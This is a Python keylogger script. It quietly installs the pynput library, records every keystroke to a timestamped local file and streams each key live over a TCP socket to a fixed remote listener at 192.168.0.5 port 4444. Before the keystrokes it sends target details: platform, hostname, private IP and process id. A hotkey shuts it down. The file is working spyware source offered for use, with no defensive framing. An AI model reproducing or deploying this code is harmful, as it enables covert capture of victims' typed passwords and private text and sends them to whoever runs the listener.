#!/usr/bin/python3

import sys, socket, threading, subprocess, time, os, random, string

bloc_num = {
		"<96>" : "0", "<97>" : "1", "<98>" : "2", "<99>" : "3", "<100>" : "4", "<101>" : "5", "<102>" : "6", "<103>" : "7", "<104>" : "8", "<105>" : "9"
	}

f_key = {
		"Key.f1":"[F1]", "Key.f2":"[F2]", "Key.f3":"[F3]", "Key.f4":"[F4]", "Key.f5":"[F5]", "Key.f6":"[F6]", "Key.f7" : "[F7]", "Key.f8":"[F8]", "Key.f9":"[F9]", "Key.f10":"[F10]", "Key.f11":"[F11]", "Key.f12":"[F12]"
	}

def oct2decimal(key):
	leng = len(key)
	decimal = 0
	for octal in key:
		leng = leng - 1
		decimal += pow(8, leng) * int(octal)
	return decimal

def socket_():
	global _socket_
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as _socket_: #List target info
			_socket_.connect(("192.168.0.5", 4444)) # dont change this 
			_socket_.sendall(f"[*] Keylogger Started with pid [{os.getpid()}]\n".encode())
			_socket_.sendall(f"    [+] Target Info:\n".encode())
			_socket_.sendall(f"       - Platform: {sys.platform}\n".encode())
			_socket_.sendall(f"       - Hostname: {socket.gethostname()}\n".encode())
			_socket_.sendall(f"       - Private IP: {socket.gethostbyname(socket.gethostname())}\n".encode())
			_socket_.sendall(f"[*] Time: {time.strftime('%A %d/%m/%Y %H:%M:%S')}\n\n".encode())
			while True:
				response = _socket_.recv(1024)
	except Exception as e:
		return False

def send(msg):
	try:
		_socket_.send(msg.encode())
	except:
		return False

def parseKeys(key):
	key = str(key)
	key = key.replace("'", "")

	if key.startswith("\\x"): # In windows when you do the ctrl + c that show like \x03, so we need to represent that like a C
		key = key.replace("\\x", "") # Delete the \x
		key = int(key, 16) # transform key to int in hexdecimal
		key = oct(key) # Transform the key in hex to oct
		if len(key) != 3: # Parse the key
			key = key[1:]
		key = key.replace("o", "")
		key = "1" + key
		decimal = oct2decimal(key) # Transform the key in decimal
		key = chr(decimal) # transform to char the decimal
		return key

	elif key == "<65027>":
		key = "[ALT_GR]"
	elif key == "<65437>":
		key = "5"
	elif key in bloc_num:
		key = bloc_num[key]
	elif key in f_key:
		key = f_key[key]
	elif key == "Key.num_lock":
		key = "[NUMPAD]"
	elif key == "Key.page_down":
		key = "[PAGE_DOWN]"
	elif key == "Key.page_up":
		key = "[PAGE_UP]"
	elif key == "Key.end":
		key = "[END]"
	elif key == "Key.home":
		key = "[HOME]"
	elif key == "Key.pause":
		key = "[PAUSE]"
	elif key == "Key.scroll_lock":
		key = "[SCROLL_LOCK]"
	elif key == "Key.print_screen":
		key = "[SCREENSHOT]"
	elif key == "Key.delete":
		key = "[DELETE]"
	elif key == "Key.esc":
		key = "[ESC]"
	elif key == "Key.enter":
		key = "[ENTR]\n"
	elif key == "Key.space":
		key = " "
	elif key == "Key.shift" or key == "Key.shift_r":
		key = "[SHIFT]"
	elif key == "Key.ctrl" or key == "Key.ctrl_l" or key == "Key.ctrl_r":
		key = "[CTRL]"
	elif key == "Key.backspace":
		key = "[BS]"
	elif key == "Key.cmd":
		key = "[CMD]"
	elif key == "Key.tab":
		key = "[HT]"
	elif key == "Key.caps_lock":
		key = "[CAPS_LOCK]"
	elif key == "Key.alt" or key == "Key.alt_l":
		key = "[ALT]"
	elif key == "Key.right":
		key = "[➜]"
	elif key == "Key.left":
		key = "[⬅]"
	elif key == "Key.up":
		key = "[⬆]"
	elif key == "Key.down":
		key = "[⬇]"
	elif key == "Key.alt_gr":
		key = "[ALT_GR]"
	elif key == "Key.insert":
		key = "[INSERT]"
	return key

def on_press(key):
	key = parseKeys(key) # Function to parse the keys typed
	all_keys.append(key) # Append to all_keys array the actual key typed
	if all_keys[-3:] == ['[CTRL]', '[SHIFT]', '[ESC]']: # HotKey to end the keylogger, you can change this
		send(key)
		f.write(key)
		send("\n\n[!] [CTRL] + [SHIFT] + [ESC] HotKey detected\n")
		send(f"[-] Keylogger finished at: {time.strftime('%A %d/%m/%Y %H:%M:%S')}\n")
		time.sleep(1)
		send(f"[!] Ending key: {ending_key}\n\n")
		f.close() # Close the file
		_socket_.close() # Close the socket
		sys.exit() # Exit from the program
	send(key) # If all_keys != ctrl + shift + esc continue with the program normally
	f.write(key) # Write in the file

if __name__ == '__main__':
	subprocess.run('pip install pynput', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) # Install pynput lib
	from pynput.keyboard import Listener, Key # Import Listener, Key from pynput lib

	ending_key = "GwE"
	values = string.ascii_letters + string.digits
	for i in range(51):
		ending_key += random.choice(values)
	t1 = threading.Thread(target=socket_) # Start a thread to socket
	t1.daemon = True
	t1.start()
	time.sleep(0.10)
	f = open(f"data {time.strftime('%d-%m-%Y %H_%M_%S')}.txt", "a", encoding="utf-8") # Create a file called data with the actual time
	all_keys = []
	send(f"[!] Ending key: {ending_key}\n\n")
	with Listener(on_press=on_press) as listener:
		listener.join() # Wait for end the thread
